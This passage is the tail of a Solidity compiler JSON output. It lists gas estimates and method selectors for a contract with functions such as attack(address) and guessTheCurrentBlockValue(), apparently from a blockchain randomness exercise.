						"codeDepositCost": "191000",
						"executionCost": "232",
						"totalCost": "191232"
					},
					"external": {
						"attack(address)": "infinite",
						"guessTheCurrentBlockValue()": "infinite",
						"guessing()": "2471",
						"guessingValue()": "2407"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"guessTheCurrentBlockValue()": "99b084bf",
					"guessing()": "79e41b39",
					"guessingValue()": "3fe6dd29"
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}